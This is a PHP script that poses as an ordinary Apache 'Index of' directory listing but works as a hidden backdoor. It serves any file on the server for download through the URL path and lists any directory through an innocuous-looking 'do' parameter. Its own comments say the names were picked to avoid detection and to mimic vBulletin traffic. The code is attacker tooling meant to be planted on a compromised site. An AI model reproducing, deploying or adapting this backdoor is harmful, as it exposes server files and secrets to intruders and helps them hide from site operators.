<?php

if($getPath = substr($_SERVER['PHP_SELF'], strlen($_SERVER['SCRIPT_NAME'])))
{
    if(is_file($getPath))
    {
        // Process the file 

        // Get the mimetype
        if(function_exists('mime_content_type'))
        {
            $mime = mime_content_type($getPath);
        }
        elseif(function_exists('finfo_file'))
        {
            $info = finfo_open(FILEINFO_MIME);
            $mime = finfo_file($info, $getPath);
            finfo_close($info);
        }
        else
        {
            $mime = 'application/force-download';
        }

        // Set the headers
        header('Content-Type: '.$mime);
        header('Content-Disposition: attachment; filename='.basename($getPath));
        header('Content-Transfer-Encoding: binary');
        header('Content-Length: '.filesize($getPath));

        // Infinite time limit
        if(!@ini_get('safe_mode'))
            @set_time_limit(0);

        // For large files
        if($handle = fopen($getPath, 'r'))
        {
            while(($buffer = fgets($handle, 4096)) !== false)
            {
                echo $buffer;
            }
            fclose($handle);
        }

        exit;

    }
    else if(is_dir($getPath))
    {
        // Process the directory
        $absolutePath = $getPath;
    }
    else
    {
        // Not found
        $err = 'File not found or access denied ( '.$getPath.' ).';
    }
}

// It uses variables not so obvious to be detected.
// "do" is used by vbulltin forum system.
if(isset($_GET['do']) and (is_dir($_GET['do'])))
{
    $absolutePath = $_GET['do'];
}

if((!isset($absolutePath)) or (!$absolutePath))
{
    $absolutePath = dirname(__file__).'/';
}

// The path is restricted?
if(isset($_POST['token']) and (strlen($absolutePath) < strlen(dirname(__file__).'/')))
{
    $absolutePath = dirname(__file__).'/';
}

$items = array(
    'glob'      => array(),
    'folders'   => array(),
    'files'     => array()
);

// if($items['glob'] = glob($absolutePath.'*')){ glob() problem with hidden files
if($items['glob'] = scandir($absolutePath))
{
    foreach($items['glob'] as $item)
    {
        if(!in_array($item, array('.','..')))
        {
            if(is_dir($absolutePath.$item))
            {
                $items['folders'][] = $absolutePath.$item.'/';
            }
            else
            {
                $items['files'][] = $absolutePath.$item;
            }
        }
        unset($item);
    }
}

// Free memory
unset($items['glob']);

?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
    <head>
        <title>Index of <?php echo htmlspecialchars($absolutePath, ENT_QUOTES); ?></title>
    </head>
    <body>
        <h1>Index of <?php echo htmlspecialchars($absolutePath, ENT_QUOTES); ?></h1>
        <?php if(isset($err)){ ?>
            <p><b><i><?php echo htmlspecialchars($err, ENT_QUOTES); ?></i></b></p>
        <?php } ?>
        
        <ul>
            <?php if(!isset($_POST['token'])){ ?>
                <li>
                    <a href="<?php echo $_SERVER['SCRIPT_NAME'].dirname(substr($absolutePath, 0, -1)); ?>/"> Parent Directory</a>
                </li>
            <?php } ?>
    
            <?php if($items['files']){ ?>
                <?php foreach($items['files'] as $file){ ?>
                    <li>
                        <a href="<?php echo $_SERVER['SCRIPT_NAME'].$file; ?>"> <?php echo htmlspecialchars(basename($file), ENT_QUOTES); ?></a>
                    </li>
                <?php } ?>
            <?php } ?>
    
            <?php if($items['folders']){ ?>
                <?php foreach($items['folders'] as $folder){ ?>
                    <li>
                        <a href="<?php echo $_SERVER['SCRIPT_NAME'].'?do='.urlencode($folder); ?>"><?php echo htmlspecialchars(basename($folder), ENT_QUOTES); ?>/</a>
                    </li>
                <?php } ?>
            <?php } ?>
    
        </ul>
        
        <address>
                    <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'], ENT_QUOTES); ?> Server
            at      <?php echo htmlspecialchars($_SERVER['HTTP_HOST'], ENT_QUOTES); ?>
            Port    <?php echo (int)$_SERVER['SERVER_PORT']; ?>
        </address>
    </body>
</html>

<?php
// Prevent arbitrary execution code by preppendfile
exit;